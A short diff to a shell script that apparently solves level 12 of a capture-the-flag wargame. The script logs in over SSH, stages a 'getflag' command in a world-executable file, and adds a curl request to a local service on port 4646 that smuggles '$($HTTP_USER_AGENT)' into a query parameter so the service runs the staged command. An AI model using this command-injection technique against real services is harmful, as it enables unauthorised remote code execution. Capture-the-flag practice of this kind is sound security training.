@@ -11,4 +11,4 @@ host="$1"
 port="$2"
 pass="$3"
 
-sshexec.sh "$host" "$port" level12 "$pass" 'set -e; echo "getflag > /tmp/flag12" > /tmp/level12; chmod a+rx /tmp/level12; cat /tmp/flag12'
+sshexec.sh "$host" "$port" level12 "$pass" 'set -e; echo "getflag > /tmp/flag12" > /tmp/level12; chmod a+rx /tmp/level12; curl -sA /tmp/level12 :::4646?x=\$\(\$HTTP_USER_AGENT\) > /dev/null; cat /tmp/flag12'
